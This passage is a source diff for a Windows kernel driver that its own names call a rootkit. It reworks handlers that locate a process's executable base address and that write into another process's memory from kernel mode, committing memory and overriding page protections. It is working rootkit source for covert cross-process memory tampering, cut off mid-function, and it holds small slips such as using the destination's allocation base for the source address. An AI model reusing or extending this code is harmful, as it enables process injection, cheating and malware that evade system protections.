@@ -2,89 +2,125 @@
 #pragma warning(disable:4996)
 
 
-/*
-====================================================================
-====================================================================
-MEMORY FUNCTIONS THAT CORRELATE TO ROOTKIT REQUESTS, SPECIFIC FUNCS:
-====================================================================
-====================================================================
-*/
-
-
 
 
 NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver MODULE BASE REQUEST\n");
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable\n");
+	ULONG NeededNameSize = 0;
+	ULONG FinalSize = 0;
+	PVOID NameBuffer = NULL;
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	RKSYSTEM_INFORET ModuleBaseRet = { 0 };
 	UNICODE_STRING ModuleName = { 0 };
 	KAPC_STATE ProcessState = { 0 };
-	ANSI_STRING AS;
+	HANDLE ProcessHandle = NULL;
 	PEPROCESS Process;
 	PLDR_DATA_TABLE_ENTRY PrcEntry = NULL;  // An LDR entry of each iterated process, used to compare names to find process module
 	PPEB_LDR_DATA PrcLdr = NULL;  // LDR data of the process
 	PPEB PrcPeb = NULL;  // Process Environent Block of the process, used to get the LDR data
 
-	// Check for invalid arguments -
-	if (strcmp(RootkInst->MdlName, "") == 0 || RootkInst->MainPID == 0) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - INVALID MODULE NAME STRING (%s)/PID OF PROCESS MODULE (%hu)\n", RootkInst->MdlName, RootkInst->MainPID);
+
+	// Check for invalid arguments:
+	if (RootkInst->MainPID == 0) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (invalid parameter: MainPID = 0)\n");
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Process EPROCESS -
+	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get EPROCESS of executable %hu)\n", RootkInst->MainPID);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-	DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST PROCESS MODULE (%s, %hu)\n", RootkInst->MdlName, RootkInst->MainPID);
 
 
-	// Get module name in a UNICODE_STRING format -
-	RtlInitAnsiString(&AS, RootkInst->MdlName);
-	RtlAnsiStringToUnicodeString(&ModuleName, &AS, TRUE);
-
-
-	// Get process PEB for the base address -
-	PrcPeb = PsGetProcessPeb(Process);
-	if (!PrcPeb) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - COULD NOT GET PROCESS PEB :(\n");
+	// Get handle to process:
+	Status = general::OpenProcessHandleADD(&ProcessHandle, RootkInst->MainPID);
+	if (!NT_SUCCESS(Status) && Status != STATUS_INFO_LENGTH_MISMATCH) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process handle of executable %hu: 0x%x)\n", RootkInst->MainPID, Status);
 		RootkInst->Out = NULL;
-		RtlFreeUnicodeString(&ModuleName);
 		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-	
 
-	// Get LDR data to iterate through -
-	KeStackAttachProcess(Process, &ProcessState);  // Attach to the process
+
+	// Get initial size needed for name:
+	Status = NtQueryProcess(ProcessHandle, ProcessImageFileName, NameBuffer, 0, &NeededNameSize);
+	if (!NT_SUCCESS(Status) && Status != STATUS_INFO_LENGTH_MISMATCH) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get needed size for executable %hu image name buffer: 0x%x)\n", RootkInst->MainPID, Status);
+		RootkInst->Out = NULL;
+		ZwClose(ProcessHandle);
+		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+
+
+	// Allocate memory for UNICODE_STRING name:
+	NameBuffer = ExAllocatePoolWithTag(NonPagedPool, NeededNameSize, 'RqIn');
+	if (NameBuffer == NULL) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot allocate memory for executable %hu image name buffer)\n", RootkInst->MainPID);
+		RootkInst->Out = NULL;
+		ZwClose(ProcessHandle);
+		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+
+
+	// Get UNICODE_STRING name of process:
+	Status = NtQueryProcess(ProcessHandle, ProcessImageFileName, NameBuffer, NeededNameSize, &FinalSize);
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get image name of executable %hu: 0x%x)\n", RootkInst->MainPID, Status);
+		RootkInst->Out = NULL;
+		ZwClose(ProcessHandle);
+		ExFreePool(NameBuffer);
+		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+
+
+	// Get substring with process name instead of the full path:
+	if (!NT_SUCCESS(general::CopyStringAfterCharADD((PUNICODE_STRING)NameBuffer, &ModuleName, L'\\'))) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get substring of name of executable %hu after \'\\\': 0x%x)\n", RootkInst->MainPID, Status);
+		RootkInst->Out = NULL;
+		ZwClose(ProcessHandle);
+		ExFreePool(NameBuffer);
+		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+    ZwClose(ProcessHandle);
+	ExFreePool(NameBuffer);
+
+
+	// Get process PEB for the base address:
+	PrcPeb = PsGetProcessPeb(Process);
+	if (PrcPeb == NULL) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process PEB of executable %hu)\n", RootkInst->MainPID);
+		RootkInst->Out = NULL;
+		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+
+
+	// Get LDR data to iterate through:
+	KeStackAttachProcess(Process, &ProcessState);
 	PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
 	if (!PrcLdr) {
-		KeUnstackDetachProcess(&ProcessState);  // Detach from the process
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - NO LOADED MODULES AT ALL FOR PROCESS (LDR = NULL) :(\n");
+		KeUnstackDetachProcess(&ProcessState);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (LDR of executable %hu = NULL)\n", RootkInst->MainPID);
 		RootkInst->Out = NULL;
-		RtlFreeUnicodeString(&ModuleName);
 		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCLOADMDLS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Iterate the process module's loader data to find the right module -
+	// Iterate the process module's loader data to find the right module:
 	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
 		PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
-		if (RtlCompareUnicodeString(&PrcEntry->BaseDllName, &ModuleName, TRUE) == NULL) {
-			KeUnstackDetachProcess(&ProcessState);  // Detach from the process
+		if (general::CompareUnicodeStringsADD(&PrcEntry->BaseDllName, &ModuleName, 0)) {
 			RootkInst->Out = PrcEntry->DllBase;
-			RtlFreeUnicodeString(&ModuleName);
-			DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST SUCCESS - MODULE (%s, %hu) WAS FOUND AT BASE ADDRESS = %p\n", RootkInst->MdlName, RootkInst->MainPID, RootkInst->Out);
+			KeUnstackDetachProcess(&ProcessState);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable succeeded, module (%hu, %wZ) was found at base address = %p\n", RootkInst->MainPID, &ModuleName, RootkInst->Out);
 			return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 		}
 	}
 
-
-	// The specified process module was not found -
-	KeUnstackDetachProcess(&ProcessState);  // Detach from the process
-	DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - MODULE (%s, %hu) WAS NOT FOUND IN THE LDR DATA\n", RootkInst->MdlName, RootkInst->MainPID);
+	// The specified process module was not found:
+	KeUnstackDetachProcess(&ProcessState);
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot find the base address of executable %hu in the LDR data)\n", RootkInst->MainPID);
 	RootkInst->Out = NULL;
-	RtlFreeUnicodeString(&ModuleName);
 	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 }
 
@@ -92,221 +128,204 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 
 
 NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST\n");
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory\n");
 	PEPROCESS EpTo;
 	PEPROCESS EpFrom;
 	KAPC_STATE DstState;
 	KAPC_STATE SrcState;
 	MEMORY_BASIC_INFORMATION ToInfo = { 0 };
 	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
-	NTSTATUS status;
-
+	NTSTATUS Status;
 	PVOID WriteToAddr = RootkInst->Out;
 	PVOID WriteFromAddr = RootkInst->Buffer;
 	ULONG64 WriteSize = RootkInst->Size;
 	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
 	SIZE_T AllocSize = ((WriteSize / PAGE_SIZE) + 1) * PAGE_SIZE;
-	ULONG OldState = MEM_FREE;  // no importance for initial value
+	ULONG OldState = 0;
 	BOOL WasCommitted = FALSE;
 	BOOL CopyAttach = FALSE;  // FALSE = DST, TRUE = SRC
 	PVOID SourceBuffer = NULL;
-	PVOID TempBuffer = NULL;
 
-	// Check for invalid arguments -
-	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
+
+	// Check for invalid arguments:
+	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more arguments are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Check for KM addresses (not allowed for this function) -
+	// Check for KM addresses (not allowed for this function):
 	if ((ULONG64)RootkInst->Out >= general::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more of the buffers are in systemspace: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Destination EPROCESS -
+	// Destination EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET DESTINATION EPROCESS (%hu) :(\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of destination process %hu)\n", RootkInst->MainPID);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Source EPROCESS -
+	// Source EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom))) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET SOURCE EPROCESS (%hu) :(\n", RootkInst->SemiPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of source process %hu)\n", RootkInst->MainPID);
 		return general::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SOURCE = (%s, %hu), DESTINATION = (%s, %hu)\n", RootkInst->MdlName, RootkInst->SemiPID, RootkInst->DstMdlName, RootkInst->MainPID);
 
 
-	// Check if writing source can be read from (only when source = UM AND its not regular buffer, KM is always readable from here) -
-	if (strcmp(RootkInst->MdlName, "regular") != 0) {
-		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
+	// Check if writing source can be read from (only when source = UM AND its not regular buffer, KM is always readable from here):
+	if ((ULONG)RootkInst->Status != REGULAR_BUFFER){
+		KeStackAttachProcess(EpFrom, &SrcState);
 		__try {
 			ProbeForRead(WriteFromAddr, AllocSize, sizeof(UCHAR));
-			status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
-			KeUnstackDetachProcess(&SrcState);  // detach from the source process
-			if (!NT_SUCCESS(status)) {
-				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT QUERY SOURCE VIRTUAL MEMORY TO VERIFY STATE\n");
+			Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
+			KeUnstackDetachProcess(&SrcState);
+			if (!NT_SUCCESS(Status)) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query source memory for reading from process %hu)\n", RootkInst->SemiPID);
 				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 		}
 
 		__except (STATUS_ACCESS_VIOLATION) {
-			KeUnstackDetachProcess(&SrcState);  // detach from the source process
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY SOURCE OF WRITING\n");
+			KeUnstackDetachProcess(&SrcState);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception while reading memory from source process %hu)\n", RootkInst->SemiPID);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 
 		}
 
 		if (!(FromInfo.State & MEM_COMMIT)) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY REGION OF WRITING IS NOT COMMITTED IN MEMORY, CANNOT VERIFY IF WRITING FROM IT IS POSSIBLE\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory from process %hu is not committed in memory, cannot verify if can read)\n", RootkInst->SemiPID);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - CHECKING IF SOURCE ADDRESS NEEDS TO BE CHANGED OR NOT\n");
-		if (FromInfo.AllocationBase == WriteFromAddr) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS DOES NOT NEED TO BE SWITCHED (%p, THE SAME AS FromInfo.AllocationBase)\n", WriteFromAddr);
-		}
-		else {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS SWITCHED FROM %p TO %p\n", WriteFromAddr, FromInfo.AllocationBase);
+		if (FromInfo.AllocationBase != WriteFromAddr && FromInfo.AllocationBase != NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory, switched source memory read address from process %hu to %p from %p\n", RootkInst->SemiPID, FromInfo.AllocationBase, WriteFromAddr);
 			WriteFromAddr = ToInfo.AllocationBase;
 			RootkInst->Buffer = WriteFromAddr;
 		}
 
+		if (FromInfo.AllocationBase == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (allocation base of memory region in source process %hu = NULL)\n", RootkInst->SemiPID);
+			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+		}
+
 		if (FromInfo.RegionSize < AllocSize) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY RANGE SIZE (%zu) < REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory range size %zu < required size to write %zu)\n", FromInfo.RegionSize, AllocSize);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE MEMORY RANGE SIZE (%zu) >= REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
 	}
-	if (strcmp(RootkInst->MdlName, "regular") == 0) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST REG-UM\n");
-	}
-	else {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UM-UM\n");
-	}
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory, regular buffer/UM source to UM destination\n");
 
 
-	// Check if writing destination can be written into -
-	// Query target address to check memory address range state (committed, reserved, free..) -
-	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
+	// Check if writing destination can be written into:
+	KeStackAttachProcess(EpTo, &DstState);
 	__try {
 		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
-		status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
+		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
 	}
 	__except (STATUS_ACCESS_VIOLATION) {
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY FST\n");
+		KeUnstackDetachProcess(&DstState);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system error occured while querying destination memory)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	if (!NT_SUCCESS(status)) {
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
+	if (!NT_SUCCESS(Status)) {
+		KeUnstackDetachProcess(&DstState);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query destination memory to verify if committed and can be written into)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	OldState = ToInfo.State;
 	if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)WriteToAddr + WriteSize)) {
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - WRONG SIZE + OUTPUT ADDRESS\n");
+		KeUnstackDetachProcess(&DstState);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination address + writing size do not match up with the base address + region size of the relevant memory region/s)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	if (!(ToInfo.State & MEM_COMMIT)) {
 		WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, ToInfo.AllocationBase, ZeroBits);
 		if (WriteToAddr == NULL) {
-			KeUnstackDetachProcess(&DstState);  // detach from the destination process
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED\n");
+			KeUnstackDetachProcess(&DstState);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is not committed and/or is not possible to commit)\n");
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		WasCommitted = TRUE;
 	}
 	else {
 		if (AllocSize <= ToInfo.RegionSize) {
-			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED WITH VALID SIZES (ALLOCBASE: %p, REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.AllocationBase, ToInfo.RegionSize, WriteSize);
 			WriteToAddr = ToInfo.AllocationBase;
 		}
 		else {
-			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED BUT INVALID SIZES (REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.RegionSize, WriteSize);
-			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &ToInfo.AllocationBase, &ToInfo.RegionSize, MEM_RELEASE);
-			if (!NT_SUCCESS(status)) {
-				KeUnstackDetachProcess(&DstState);  // detach from the destination process
-				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT RELEASE ALREADY MISMATCHING COMMITTED AREA\n");
+			Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &ToInfo.AllocationBase, &ToInfo.RegionSize, MEM_RELEASE);
+			if (!NT_SUCCESS(Status)) {
+				KeUnstackDetachProcess(&DstState);
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is already committed with invalid attributes, cannot free it)\n");
 				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 
 			WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
 			if (WriteToAddr == NULL) {
-				KeUnstackDetachProcess(&DstState);  // detach from the destination process
-				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED NEW COMMITEMENT\n");
+				KeUnstackDetachProcess(&DstState);
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot commit memory in the relevant region of memory in destination process)\n");
 				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 			WasCommitted = TRUE;
 			OldState = MEM_COMMIT;
 		}
 	}
-	KeUnstackDetachProcess(&DstState);  // detach from the destination process
+	KeUnstackDetachProcess(&DstState);
 	RootkInst->Out = WriteToAddr;  // NOT INSIDE - C00..5 BECAUSE OF ATTACHING TO PROCESS
 
 
-	// Query target address to check memory address range protection settings (access to memory) -
-	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
-	status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
-
-	if (!NT_SUCCESS(status)) {
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
+	// Query target address to check memory address range protection settings (access to memory):
+	KeStackAttachProcess(EpTo, &DstState);
+	Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
+	if (!NT_SUCCESS(Status)) {
+		KeUnstackDetachProcess(&DstState);
 		if (WasCommitted) {
 			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
-
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (querying virtual memory of destination failed)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE || ToInfo.Protect & PAGE_READWRITE || ToInfo.Protect & PAGE_WRITECOPY || ToInfo.Protect & PAGE_EXECUTE_WRITECOPY) || ToInfo.Protect & PAGE_GUARD || ToInfo.Protect & PAGE_NOACCESS) {
 		if (!ChangeProtectionSettingsADD(ZwCurrentProcess(), WriteToAddr, (ULONG)AllocSize, PAGE_READWRITE, ToInfo.Protect)) {
-			KeUnstackDetachProcess(&DstState);  // detach from the destination process
+			KeUnstackDetachProcess(&DstState);
 			if (WasCommitted) {
 				general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 			}
-
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DO NOT HAVE WRITE PERMISSIONS\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (do not have write permissions into destination memory)\n");
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
-	KeUnstackDetachProcess(&DstState);  // detach from the destination process
+	KeUnstackDetachProcess(&DstState);
 
 
-	// Copy virtual memory (r/u-u) -
+	// Copy virtual memory (provided buffer/u-u):
 	__try {
-		KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
+		KeStackAttachProcess(EpTo, &DstState);
 		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
-
-		KeStackAttachProcess(EpFrom, &SrcState);  // attach to source process
+		KeUnstackDetachProcess(&DstState);
+		KeStackAttachProcess(EpFrom, &SrcState);
 		CopyAttach = TRUE;
 		ProbeForRead(WriteFromAddr, WriteSize, sizeof(UCHAR));
-		KeUnstackDetachProcess(&SrcState);  // detach from the source process
+		KeUnstackDetachProcess(&SrcState);
 		CopyAttach = FALSE;
 	}
 
 	__except (STATUS_ACCESS_VIOLATION) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT WRITEABLE FOR MMCOPYVIRTUALMEMORY\n");
 		if (CopyAttach) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM SOURCE PROCESS..\n");
-			KeUnstackDetachProcess(&SrcState);  // detach from the source process
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception in source process)\n");
+			KeUnstackDetachProcess(&SrcState);
 		}
 		else {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM DESTINATION PROCESS..\n");
-			KeUnstackDetachProcess(&DstState);  // detach from the destination process
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception in destination process)\n");
+			KeUnstackDetachProcess(&DstState);
 		}
-
 		if (WasCommitted) {
 			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
@@ -315,61 +334,39 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Get the source buffer into kernel mode -
-	SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 0x45674567);
+	// Get the source buffer into kernel mode:
+	SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 'RqWs');
 	if (SourceBuffer == NULL) {
 		if (WasCommitted) {
 			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
